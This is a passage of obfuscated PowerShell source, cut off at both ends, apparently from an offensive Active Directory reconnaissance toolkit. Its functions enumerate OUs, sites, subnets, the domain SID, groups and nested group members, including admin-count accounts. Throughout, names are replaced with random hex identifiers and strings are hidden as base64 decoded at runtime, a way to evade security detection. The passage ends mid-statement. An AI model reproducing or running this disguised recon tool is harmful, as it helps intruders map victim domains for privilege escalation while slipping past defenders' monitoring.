        Get-NetComputer -c4d5e29aa5ae43dc97a75d43cbc64f02 ${c4d5e29aa5ae43dc97a75d43cbc64f02} -afa30c601e734738b32424a6234484e4 ${afa30c601e734738b32424a6234484e4} -a3bf4f2494234d89b62febc9f379f624 ${a3bf4f2494234d89b62febc9f379f624} -c489e407a44b4d378d17e6f8021054c1 -a48507564a8248e5b01d3a563f4bc865 "(${cafb48fc09ca44f7b238fde16d9ec320}=*${ae2b48b0b86f414e9a06895d10c31dc2}*)" -c8e7665cd4cc41d88229c3536a114f1b ${c8e7665cd4cc41d88229c3536a114f1b} | select samaccountname,${cafb48fc09ca44f7b238fde16d9ec320}
    }
}
function Get-NetOU {
    [CmdletBinding()]
    Param (
        [Parameter(ValueFromPipeline=$True)]
        [String]
        ${d96f91df8b9c420494e8ed136faa0bfd} = '*',
        [String]
        ${b3dcc7338bfc4d97afb02a12d590c57a},
        [String]
        ${afa30c601e734738b32424a6234484e4},
        [String]
        ${a3bf4f2494234d89b62febc9f379f624},
        [String]
        ${c4d5e29aa5ae43dc97a75d43cbc64f02},
        [Switch]
        ${c489e407a44b4d378d17e6f8021054c1},
        [ValidateRange(1,10000)] 
        [Int]
        ${c8e7665cd4cc41d88229c3536a114f1b} = 200
    )
    begin {
        ${5959a3d98b5348d4a11e7f9373434767} = Get-DomainSearcher -afa30c601e734738b32424a6234484e4 ${afa30c601e734738b32424a6234484e4} -a3bf4f2494234d89b62febc9f379f624 ${a3bf4f2494234d89b62febc9f379f624} -c4d5e29aa5ae43dc97a75d43cbc64f02 ${c4d5e29aa5ae43dc97a75d43cbc64f02} -c8e7665cd4cc41d88229c3536a114f1b ${c8e7665cd4cc41d88229c3536a114f1b}
    }
    process {
        if (${5959a3d98b5348d4a11e7f9373434767}) {
            if (${b3dcc7338bfc4d97afb02a12d590c57a}) {
                ${5959a3d98b5348d4a11e7f9373434767}.filter="(&(objectCategory=organizationalUnit)(name=${d96f91df8b9c420494e8ed136faa0bfd})(gplink=*${b3dcc7338bfc4d97afb02a12d590c57a}*))"
            }
            else {
                ${5959a3d98b5348d4a11e7f9373434767}.filter="(&(objectCategory=organizationalUnit)(name=${d96f91df8b9c420494e8ed136faa0bfd}))"
            }
            ${5959a3d98b5348d4a11e7f9373434767}.FindAll() | ? {$_} | % {
                if (${c489e407a44b4d378d17e6f8021054c1}) {
                    Convert-LDAPProperty -d90960fc83614a2fb42f43ab6aac95a1 $_.Properties
                }
                else { 
                    $_.properties.adspath
                }
            }
        }
    }
}
function Get-NetSite {
    [CmdletBinding()]
    Param (
        [Parameter(ValueFromPipeline=$True)]
        [String]
        ${be819d08159147d788c243be770c66af} = "*",
        [String]
        ${afa30c601e734738b32424a6234484e4},
        [String]
        ${a3bf4f2494234d89b62febc9f379f624},
        [String]
        ${c4d5e29aa5ae43dc97a75d43cbc64f02},
        [String]
        ${b3dcc7338bfc4d97afb02a12d590c57a},
        [Switch]
        ${c489e407a44b4d378d17e6f8021054c1},
        [ValidateRange(1,10000)] 
        [Int]
        ${c8e7665cd4cc41d88229c3536a114f1b} = 200
    )
    begin {
        ${b87323ae541a417386f7c4bf3d5010f9} = Get-DomainSearcher -c4d5e29aa5ae43dc97a75d43cbc64f02 ${c4d5e29aa5ae43dc97a75d43cbc64f02} -afa30c601e734738b32424a6234484e4 ${afa30c601e734738b32424a6234484e4} -a3bf4f2494234d89b62febc9f379f624 ${a3bf4f2494234d89b62febc9f379f624} -bbc4680c371c4b70bf799c47787e7f27 $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QwBOAD0AUwBpAHQAZQBzACwAQwBOAD0AQwBvAG4AZgBpAGcAdQByAGEAdABpAG8AbgA='))) -c8e7665cd4cc41d88229c3536a114f1b ${c8e7665cd4cc41d88229c3536a114f1b}
    }
    process {
        if(${b87323ae541a417386f7c4bf3d5010f9}) {
            if (${b3dcc7338bfc4d97afb02a12d590c57a}) {
                ${b87323ae541a417386f7c4bf3d5010f9}.filter="(&(objectCategory=site)(name=${be819d08159147d788c243be770c66af})(gplink=*${b3dcc7338bfc4d97afb02a12d590c57a}*))"
            }
            else {
                ${b87323ae541a417386f7c4bf3d5010f9}.filter="(&(objectCategory=site)(name=${be819d08159147d788c243be770c66af}))"
            }
            try {
                ${b87323ae541a417386f7c4bf3d5010f9}.FindAll() | ? {$_} | % {
                    if (${c489e407a44b4d378d17e6f8021054c1}) {
                        Convert-LDAPProperty -d90960fc83614a2fb42f43ab6aac95a1 $_.Properties
                    }
                    else {
                        $_.properties.name
                    }
                }
            }
            catch {
                Write-Warning $_
            }
        }
    }
}
function Get-NetSubnet {
    [CmdletBinding()]
    Param (
        [Parameter(ValueFromPipeline=$True)]
        [String]
        ${be819d08159147d788c243be770c66af} = "*",
        [String]
        ${afa30c601e734738b32424a6234484e4},
        [String]
        ${c4d5e29aa5ae43dc97a75d43cbc64f02},
        [String]
        ${a3bf4f2494234d89b62febc9f379f624},
        [Switch]
        ${c489e407a44b4d378d17e6f8021054c1},
        [ValidateRange(1,10000)] 
        [Int]
        ${c8e7665cd4cc41d88229c3536a114f1b} = 200
    )
    begin {
        ${46f0b104b8e040f98c44b342a46f4c50} = Get-DomainSearcher -afa30c601e734738b32424a6234484e4 ${afa30c601e734738b32424a6234484e4} -a3bf4f2494234d89b62febc9f379f624 ${a3bf4f2494234d89b62febc9f379f624} -c4d5e29aa5ae43dc97a75d43cbc64f02 ${c4d5e29aa5ae43dc97a75d43cbc64f02} -bbc4680c371c4b70bf799c47787e7f27 $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QwBOAD0AUwB1AGIAbgBlAHQAcwAsAEMATgA9AFMAaQB0AGUAcwAsAEMATgA9AEMAbwBuAGYAaQBnAHUAcgBhAHQAaQBvAG4A'))) -c8e7665cd4cc41d88229c3536a114f1b ${c8e7665cd4cc41d88229c3536a114f1b}
    }
    process {
        if(${46f0b104b8e040f98c44b342a46f4c50}) {
            ${46f0b104b8e040f98c44b342a46f4c50}.filter=$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('KAAmACgAbwBiAGoAZQBjAHQAQwBhAHQAZQBnAG8AcgB5AD0AcwB1AGIAbgBlAHQAKQApAA==')))
            try {
                ${46f0b104b8e040f98c44b342a46f4c50}.FindAll() | ? {$_} | % {
                    if (${c489e407a44b4d378d17e6f8021054c1}) {
                        Convert-LDAPProperty -d90960fc83614a2fb42f43ab6aac95a1 $_.Properties | ? { $_.siteobject -match "CN=${be819d08159147d788c243be770c66af}" }
                    }
                    else {
                        if ( (${be819d08159147d788c243be770c66af} -and ($_.properties.siteobject -match "CN=${be819d08159147d788c243be770c66af},")) -or (${be819d08159147d788c243be770c66af} -eq '*')) {
                            ${a97dbb116ed44153832c73bdfef0b665} = @{
                                'Subnet' = $_.properties.name[0]
                            }
                            try {
                                ${a97dbb116ed44153832c73bdfef0b665}[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBpAHQAZQA=')))] = ($_.properties.siteobject[0]).split(",")[0]
                            }
                            catch {
                                ${a97dbb116ed44153832c73bdfef0b665}[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBpAHQAZQA=')))] = $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RQByAHIAbwByAA==')))
                            }
                            New-Object -TypeName PSObject -Property ${a97dbb116ed44153832c73bdfef0b665}                 
                        }
                    }
                }
            }
            catch {
                Write-Warning $_
            }
        }
    }
}
function Get-DomainSID {
    param(
        [String]
        ${afa30c601e734738b32424a6234484e4}
    )
    ${7c91682d6c48459fa2349d85055ca9e2} = Get-NetDomain -afa30c601e734738b32424a6234484e4 ${afa30c601e734738b32424a6234484e4}
    if(${7c91682d6c48459fa2349d85055ca9e2}) {
        ${af1157220dd54328bf445c6b5112e411} = ${7c91682d6c48459fa2349d85055ca9e2}.PdcRoleOwner
        ${3a6be81cceca4444a951dec6e42f17b4} = (Get-NetComputer -afa30c601e734738b32424a6234484e4 ${afa30c601e734738b32424a6234484e4} -c096522c7bbe4c7aaadf99843e3b09fb ${af1157220dd54328bf445c6b5112e411} -c489e407a44b4d378d17e6f8021054c1).objectsid
        ${076e36dda7734263a96704324ac1ecf0} = ${3a6be81cceca4444a951dec6e42f17b4}.split("-")
        ${076e36dda7734263a96704324ac1ecf0}[0..(${076e36dda7734263a96704324ac1ecf0}.length -2)] -join "-"
    }
}
function Get-NetGroup {
    [CmdletBinding()]
    param(
        [Parameter(ValueFromPipeline=$True)]
        [String]
        ${a0852a4c33684bf0877105c6da3a9074} = '*',
        [String]
        ${d72c41ecfd1e4100a077ef856e028545},
        [String]
        ${dfa85e24773f431f91e73de068d7b94e},
        [String]
        ${a48507564a8248e5b01d3a563f4bc865},
        [String]
        ${afa30c601e734738b32424a6234484e4},
        [String]
        ${a3bf4f2494234d89b62febc9f379f624},
        [String]
        ${c4d5e29aa5ae43dc97a75d43cbc64f02},
        [Switch]
        ${c158a3a278cc485f9b7a13755fb2e250},
        [Switch]
        ${c489e407a44b4d378d17e6f8021054c1},
        [Switch]
        ${d4b201a98f994b6a84279c99ec61a4dc},
        [ValidateRange(1,10000)] 
        [Int]
        ${c8e7665cd4cc41d88229c3536a114f1b} = 200
    )
    begin {
        ${b644340cbf5b444e9a4a13e5e6965dc5} = Get-DomainSearcher -afa30c601e734738b32424a6234484e4 ${afa30c601e734738b32424a6234484e4} -a3bf4f2494234d89b62febc9f379f624 ${a3bf4f2494234d89b62febc9f379f624} -c4d5e29aa5ae43dc97a75d43cbc64f02 ${c4d5e29aa5ae43dc97a75d43cbc64f02} -c8e7665cd4cc41d88229c3536a114f1b ${c8e7665cd4cc41d88229c3536a114f1b}
    }
    process {
        if(${b644340cbf5b444e9a4a13e5e6965dc5}) {
            if(${c158a3a278cc485f9b7a13755fb2e250}) {
                Write-Verbose $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QwBoAGUAYwBrAGkAbgBnACAAZgBvAHIAIABhAGQAbQBpAG4AQwBvAHUAbgB0AD0AMQA=')))
                ${a48507564a8248e5b01d3a563f4bc865} += $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('KABhAGQAbQBpAG4AYwBvAHUAbgB0AD0AMQApAA==')))
            }
            if (${dfa85e24773f431f91e73de068d7b94e}) {
                ${d98950af3033419194b20c9afd35b025} = Get-ADObject -a7648af93b714896863ad23fbb505ae4 ${dfa85e24773f431f91e73de068d7b94e} -afa30c601e734738b32424a6234484e4 ${afa30c601e734738b32424a6234484e4} -a3bf4f2494234d89b62febc9f379f624 ${a3bf4f2494234d89b62febc9f379f624} -bdf922e6c318437e9867b00a00c3dd4b -c8e7665cd4cc41d88229c3536a114f1b ${c8e7665cd4cc41d88229c3536a114f1b}
                ${1ec223624e784632bfaaf9cee06fd786} = ${d98950af3033419194b20c9afd35b025}.GetDirectoryEntry()
                ${1ec223624e784632bfaaf9cee06fd786}.RefreshCache($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('dABvAGsAZQBuAEcAcgBvAHUAcABzAA=='))))
                ${1ec223624e784632bfaaf9cee06fd786}.TokenGroups | Foreach-Object {
                    ${76c047048c844c1a9c711d939cbe59eb} = (New-Object System.Security.Principal.SecurityIdentifier($_,0)).Value
                    if(!(${76c047048c844c1a9c711d939cbe59eb} -match $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('XgBTAC0AMQAtADUALQAzADIALQA1ADQANQB8AC0ANQAxADMAJAA='))))) {
                        if(${c489e407a44b4d378d17e6f8021054c1}) {
                            Get-ADObject -d72c41ecfd1e4100a077ef856e028545 ${76c047048c844c1a9c711d939cbe59eb} -c8e7665cd4cc41d88229c3536a114f1b ${c8e7665cd4cc41d88229c3536a114f1b}
                        }
                        else {
                            if(${d4b201a98f994b6a84279c99ec61a4dc}) {
                                ${76c047048c844c1a9c711d939cbe59eb}
                            }
                            else {
                                Convert-SidToName ${76c047048c844c1a9c711d939cbe59eb}
                            }
                        }
                    }
                }
            }
            else {
                if (${d72c41ecfd1e4100a077ef856e028545}) {
                    ${b644340cbf5b444e9a4a13e5e6965dc5}.filter = "(&(objectCategory=group)(objectSID=${d72c41ecfd1e4100a077ef856e028545})${a48507564a8248e5b01d3a563f4bc865})"
                }
                else {
                    ${b644340cbf5b444e9a4a13e5e6965dc5}.filter = "(&(objectCategory=group)(name=${a0852a4c33684bf0877105c6da3a9074})${a48507564a8248e5b01d3a563f4bc865})"
                }
                ${b644340cbf5b444e9a4a13e5e6965dc5}.FindAll() | ? {$_} | % {
                    if (${c489e407a44b4d378d17e6f8021054c1}) {
                        Convert-LDAPProperty -d90960fc83614a2fb42f43ab6aac95a1 $_.Properties
                    }
                    else {
                        $_.properties.samaccountname
                    }
                }
            }
        }
    }
}
function Get-NetGroupMember {
    [CmdletBinding()]
    param(
        [Parameter(ValueFromPipeline=$True)]
        [String]
        ${a0852a4c33684bf0877105c6da3a9074},
        [String]
        ${d72c41ecfd1e4100a077ef856e028545},
        [String]
        ${afa30c601e734738b32424a6234484e4} = (Get-NetDomain).Name,
        [String]
        ${a3bf4f2494234d89b62febc9f379f624},
        [String]
        ${c4d5e29aa5ae43dc97a75d43cbc64f02},
        [Switch]
        ${c489e407a44b4d378d17e6f8021054c1},
        [Switch]
        ${d722399685d842b19fa5d48261792164},
        [Switch]
        ${dfb50048f56a421fb467b52a20ef2495},
        [ValidateRange(1,10000)] 
        [Int]
        ${c8e7665cd4cc41d88229c3536a114f1b} = 200
    )
    begin {
        ${b644340cbf5b444e9a4a13e5e6965dc5} = Get-DomainSearcher -afa30c601e734738b32424a6234484e4 ${afa30c601e734738b32424a6234484e4} -a3bf4f2494234d89b62febc9f379f624 ${a3bf4f2494234d89b62febc9f379f624} -c4d5e29aa5ae43dc97a75d43cbc64f02 ${c4d5e29aa5ae43dc97a75d43cbc64f02} -c8e7665cd4cc41d88229c3536a114f1b ${c8e7665cd4cc41d88229c3536a114f1b}
        if(!${a3bf4f2494234d89b62febc9f379f624}) {
            ${a3bf4f2494234d89b62febc9f379f624} = ((Get-NetDomain).PdcRoleOwner).Name
        }
    }
    process {
        if (${b644340cbf5b444e9a4a13e5e6965dc5}) {
            if (${d722399685d842b19fa5d48261792164} -and ${dfb50048f56a421fb467b52a20ef2495}) {
                if (${a0852a4c33684bf0877105c6da3a9074}) {
                    ${e84898b3b02d436697861293d1bb9448} = Get-NetGroup -a0852a4c33684bf0877105c6da3a9074 ${a0852a4c33684bf0877105c6da3a9074} -afa30c601e734738b32424a6234484e4 ${afa30c601e734738b32424a6234484e4} -c489e407a44b4d378d17e6f8021054c1 -c8e7665cd4cc41d88229c3536a114f1b ${c8e7665cd4cc41d88229c3536a114f1b}
                }
                elseif (${d72c41ecfd1e4100a077ef856e028545}) {
                    ${e84898b3b02d436697861293d1bb9448} = Get-NetGroup -d72c41ecfd1e4100a077ef856e028545 ${d72c41ecfd1e4100a077ef856e028545} -afa30c601e734738b32424a6234484e4 ${afa30c601e734738b32424a6234484e4} -c489e407a44b4d378d17e6f8021054c1 -c8e7665cd4cc41d88229c3536a114f1b ${c8e7665cd4cc41d88229c3536a114f1b}
                }
                else {
                    ${d72c41ecfd1e4100a077ef856e028545} = (Get-DomainSID -afa30c601e734738b32424a6234484e4 ${afa30c601e734738b32424a6234484e4}) + $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('LQA1ADEAMgA=')))
                    ${e84898b3b02d436697861293d1bb9448} = Get-NetGroup -d72c41ecfd1e4100a077ef856e028545 ${d72c41ecfd1e4100a077ef856e028545} -afa30c601e734738b32424a6234484e4 ${afa30c601e734738b32424a6234484e4} -c489e407a44b4d378d17e6f8021054c1 -c8e7665cd4cc41d88229c3536a114f1b ${c8e7665cd4cc41d88229c3536a114f1b}
                }
                ${169b9b47d26d463db62228cf8ac40f37} = ${e84898b3b02d436697861293d1bb9448}.distinguishedname
                ${a5b4302b1e824c6d8b2a0900eb78c9a2} = ${e84898b3b02d436697861293d1bb9448}.name
                if (${169b9b47d26d463db62228cf8ac40f37}) {
                    ${b644340cbf5b444e9a4a13e5e6965dc5}.filter = "(&(samAccountType=805306368)(memberof:1.2.840.113556.1.4.1941:=${169b9b47d26d463db62228cf8ac40f37})${a48507564a8248e5b01d3a563f4bc865})"
                    ${b644340cbf5b444e9a4a13e5e6965dc5}.PropertiesToLoad.AddRange(($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('ZABpAHMAdABpAG4AZwB1AGkAcwBoAGUAZABOAGEAbQBlAA=='))),$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('cwBhAG0AYQBjAGMAbwB1AG4AdAB0AHkAcABlAA=='))),$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('bABhAHMAdABsAG8AZwBvAG4A'))),$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('bABhAHMAdABsAG8AZwBvAG4AdABpAG0AZQBzAHQAYQBtAHAA'))),$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('ZABzAGMAbwByAGUAcAByAG8AcABhAGcAYQB0AGkAbwBuAGQAYQB0AGEA'))),$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('bwBiAGoAZQBjAHQAcwBpAGQA'))),$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('dwBoAGUAbgBjAHIAZQBhAHQAZQBkAA=='))),$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('YgBhAGQAcABhAHMAcwB3AG8AcgBkAHQAaQBtAGUA'))),$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('YQBjAGMAbwB1AG4AdABlAHgAcABpAHIAZQBzAA=='))),$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('aQBzAGMAcgBpAHQAaQBjAGEAbABzAHkAcwB0AGUAbQBvAGIAagBlAGMAdAA='))),$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('bgBhAG0AZQA='))),$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('dQBzAG4AYwBoAGEAbgBnAGUAZAA='))),$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('bwBiAGoAZQBjAHQAYwBhAHQAZQBnAG8AcgB5AA=='))),$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('ZABlAHMAYwByAGkAcAB0AGkAbwBuAA=='))),$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('YwBvAGQAZQBwAGEAZwBlAA=='))),$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('aQBuAHMAdABhAG4AYwBlAHQAeQBwAGUA'))),$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('YwBvAHUAbgB0AHIAeQBjAG8AZABlAA=='))),$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('ZABpAHMAdABpAG4AZwB1AGkAcwBoAGUAZABuAGEAbQBlAA=='))),'cn',$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('YQBkAG0AaQBuAGMAbwB1AG4AdAA='))),$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('bABvAGcAbwBuAGgAbwB1AHIAcwA='))),$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('bwBiAGoAZQBjAHQAYwBsAGEAcwBzAA=='))),$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('bABvAGcAbwBuAGMAbwB1AG4AdAA='))),$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('dQBzAG4AYwByAGUAYQB0AGUAZAA='))),$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('dQBzAGUAcgBhAGMAYwBvAHUAbgB0AGMAbwBuAHQAcgBvAGwA'))),$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('bwBiAGoAZQBjAHQAZwB1AGkAZAA='))),$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('cAByAGkAbQBhAHIAeQBnAHIAbwB1AHAAaQBkAA=='))),$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('bABhAHMAdABsAG8AZwBvAGYAZgA='))),$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('cwBhAG0AYQBjAGMAbwB1AG4AdABuAGEAbQBlAA=='))),$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('YgBhAGQAcAB3AGQAYwBvAHUAbgB0AA=='))),$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('dwBoAGUAbgBjAGgAYQBuAGcAZQBkAA=='))),$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('bQBlAG0AYgBlAHIAbwBmAA=='))),$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('cAB3AGQAbABhAHMAdABzAGUAdAA='))),$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('YQBkAHMAcABhAHQAaAA=')))))
                    ${cece1f195f3049e48a567091c9433159} = ${b644340cbf5b444e9a4a13e5e6965dc5}.FindAll()
                    ${a5b4302b1e824c6d8b2a0900eb78c9a2} = ${a0852a4c33684bf0877105c6da3a9074}
                }
                else {
                    Write-Error $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VQBuAGEAYgBsAGUAIAB0AG8AIABmAGkAbgBkACAARwByAG8AdQBwAA==')))
                }
            }
            else {
                if (${a0852a4c33684bf0877105c6da3a9074}) {
                    ${b644340cbf5b444e9a4a13e5e6965dc5}.filter = "(&(objectCategory=group)(name=${a0852a4c33684bf0877105c6da3a9074})${a48507564a8248e5b01d3a563f4bc865})"
                }
                elseif (${d72c41ecfd1e4100a077ef856e028545}) {
                    ${b644340cbf5b444e9a4a13e5e6965dc5}.filter = "(&(objectCategory=group)(objectSID=${d72c41ecfd1e4100a077ef856e028545})${a48507564a8248e5b01d3a563f4bc865})"
                }
                else {
                    ${d72c41ecfd1e4100a077ef856e028545} = (Get-DomainSID -afa30c601e734738b32424a6234484e4 ${afa30c601e734738b32424a6234484e4}) + $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('LQA1ADEAMgA=')))
                    ${b644340cbf5b444e9a4a13e5e6965dc5}.filter = "(&(objectCategory=group)(objectSID=${d72c41ecfd1e4100a077ef856e028545})${a48507564a8248e5b01d3a563f4bc865})"
                }
                ${b644340cbf5b444e9a4a13e5e6965dc5}.FindAll() | % {
                    try {
                        if (!($_) -or !($_.properties) -or !($_.properties.name)) { continue }
                        ${a5b4302b1e824c6d8b2a0900eb78c9a2} = $_.properties.name[0]
                        ${cece1f195f3049e48a567091c9433159} = @()
                        if ($_.properties.member.Count -eq 0) {
                            ${471cd62dffa041eda04c4a1e50fa812b} = $False
                            ${50363b47d3b341b187795a1bd46198b5} = 0
                            ${69100e49cd9747358821fdc26dbcdef7} = 0
                            while(!${471cd62dffa041eda04c4a1e50fa812b}) {
                                ${69100e49cd9747358821fdc26dbcdef7} = ${50363b47d3b341b187795a1bd46198b5} + 1499
                                ${7e739e2d47984c2c8ebbee1aef4af1e4}="member;range=${50363b47d3b341b187795a1bd46198b5}-${69100e49cd9747358821fdc26dbcdef7}"
                                ${50363b47d3b341b187795a1bd46198b5} += 1500
                                ${b644340cbf5b444e9a4a13e5e6965dc5}.PropertiesToLoad.Clear()
                                [void]${b644340cbf5b444e9a4a13e5e6965dc5}.PropertiesToLoad.Add("${7e739e2d47984c2c8ebbee1aef4af1e4}")
                                try {
                                    ${934af845da6e4eb0a5370de6d7b8da04} = ${b644340cbf5b444e9a4a13e5e6965dc5}.FindOne()
                                    if (${934af845da6e4eb0a5370de6d7b8da04}) {
                                        ${279292c623a044939d33e95093436863} = $_.Properties.PropertyNames -like $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('bQBlAG0AYgBlAHIAOwByAGEAbgBnAGUAPQAqAA==')))
                                        ${c4a41499c8654975888fc2e39184e1e7} = $_.Properties.item(${279292c623a044939d33e95093436863})
                                        if (${c4a41499c8654975888fc2e39184e1e7}.count -eq 0) {
                                            ${471cd62dffa041eda04c4a1e50fa812b} = $True
                                        }
                                        else {
                                            ${c4a41499c8654975888fc2e39184e1e7} | % {
                                                ${cece1f195f3049e48a567091c9433159} += $_
                                            }
                                        }
                                    }
                                    else {
                                        ${471cd62dffa041eda04c4a1e50fa812b} = $True
                                    }
                                } 
                                catch [System.Management.Automation.MethodInvocationException] {
                                    ${471cd62dffa041eda04c4a1e50fa812b} = $True
                                }
                            }
                        } 
                        else {
                            ${cece1f195f3049e48a567091c9433159} = $_.properties.member
                        }
                    } 
                    catch {
                        Write-Verbose $_
                    }
                }
            }
            ${cece1f195f3049e48a567091c9433159} | ? {$_} | % {
                if (${d722399685d842b19fa5d48261792164} -and ${dfb50048f56a421fb467b52a20ef2495}) {
                    ${d90960fc83614a2fb42f43ab6aac95a1} = $_.Properties
                } 
                else {
                    if(${a3bf4f2494234d89b62febc9f379f624}) {
                        ${934af845da6e4eb0a5370de6d7b8da04} = [adsi]"LDAP://${a3bf4f2494234d89b62febc9f379f624}/$_"
                    }
                    else {
                        ${934af845da6e4eb0a5370de6d7b8da04} = [adsi]"LDAP://$_"
                    }
                    if(${934af845da6e4eb0a5370de6d7b8da04}){
                        ${d90960fc83614a2fb42f43ab6aac95a1} = ${934af845da6e4eb0a5370de6d7b8da04}.Properties
                    }
                }
                if(${d90960fc83614a2fb42f43ab6aac95a1}) {
                    if(${d90960fc83614a2fb42f43ab6aac95a1}.samaccounttype -notmatch $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('OAAwADUAMwAwADYAMwA2ADgA')))) {
                        ${def96a50aa8f4ca7b8e76e20c0eb5c87} = $True
                    }
                    else {
                        ${def96a50aa8f4ca7b8e76e20c0eb5c87} = $False
                    }
                    if (${c489e407a44b4d378d17e6f8021054c1}) {
                        ${3810b84f4ca941878f772118989533a7} = Convert-LDAPProperty -d90960fc83614a2fb42f43ab6aac95a1 ${d90960fc83614a2fb42f43ab6aac95a1}
                    }
                    else {
                        ${3810b84f4ca941878f772118989533a7} = New-Object PSObject
                    }
                    ${3810b84f4ca941878f772118989533a7} | Add-Member Noteproperty $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RwByAG8AdQBwAEQAbwBtAGEAaQBuAA=='))) ${afa30c601e734738b32424a6234484e4}
                    ${3810b84f4ca941878f772118989533a7} | Add-Member Noteproperty $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RwByAG8AdQBwAE4AYQBtAGUA'))) ${a5b4302b1e824c6d8b2a0900eb78c9a2}
                    try {
                        ${90aa09aa19244112b72f8e1a37891707} = ${d90960fc83614a2fb42f43ab6aac95a1}.distinguishedname[0]
                        ${b12c15582cce43a4ab90d2f8e2ab306a} = ${90aa09aa19244112b72f8e1a37891707}.subString(${90aa09aa19244112b72f8e1a37891707}.IndexOf($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RABDAD0A'))))) -replace $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RABDAD0A'))),'' -replace ',','.'
                    }
                    catch {
                        ${90aa09aa19244112b72f8e1a37891707} = $Null
                        ${b12c15582cce43a4ab90d2f8e2ab306a} = $Null
                    }
                    if (${d90960fc83614a2fb42f43ab6aac95a1}.samaccountname) {
                        ${a93a7a3a61c64d07a2f6770952369f81} = ${d90960fc83614a2fb42f43ab6aac95a1}.samaccountname[0]
                    } 
                    else {
                        try {
                            ${a93a7a3a61c64d07a2f6770952369f81} = Convert-SidToName ${d90960fc83614a2fb42f43ab6aac95a1}.cn[0]
                        }
                        catch {
                            ${a93a7a3a61c64d07a2f6770952369f81} = ${d90960fc83614a2fb42f43ab6aac95a1}.cn
                        }
                    }
                    if(${d90960fc83614a2fb42f43ab6aac95a1}.objectSid) {
                        ${a332ac78867b4fef9a1a4bdcdbefb63d} = ((New-Object System.Security.Principal.SecurityIdentifier ${d90960fc83614a2fb42f43ab6aac95a1}.objectSid[0],0).Value)
                    }
                    else {
                        ${a332ac78867b4fef9a1a4bdcdbefb63d} = $Null
                    }
                    ${3810b84f4ca941878f772118989533a7} | Add-Member Noteproperty $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('TQBlAG0AYgBlAHIARABvAG0AYQBpAG4A'))) ${b12c15582cce43a4ab90d2f8e2ab306a}
                    ${3810b84f4ca941878f772118989533a7} | Add-Member Noteproperty $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('TQBlAG0AYgBlAHIATgBhAG0AZQA='))) ${a93a7a3a61c64d07a2f6770952369f81}
                    ${3810b84f4ca941878f772118989533a7} | Add-Member Noteproperty $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('TQBlAG0AYgBlAHIAUwBpAGQA'))) ${a332ac78867b4fef9a1a4bdcdbefb63d}
                    ${3810b84f4ca941878f772118989533a7} | Add-Member Noteproperty $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('SQBzAEcAcgBvAHUAcAA='))) ${def96a50aa8f4ca7b8e76e20c0eb5c87}
                    ${3810b84f4ca941878f772118989533a7} | Add-Member Noteproperty $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('TQBlAG0AYgBlAHIARABOAA=='))) ${90aa09aa19244112b72f8e1a37891707}
                    ${3810b84f4ca941878f772118989533a7}
                    if (${d722399685d842b19fa5d48261792164} -and !${dfb50048f56a421fb467b52a20ef2495} -and ${def96a50aa8f4ca7b8e76e20c0eb5c87} -and ${a93a7a3a61c64d07a2f6770952369f81}) {
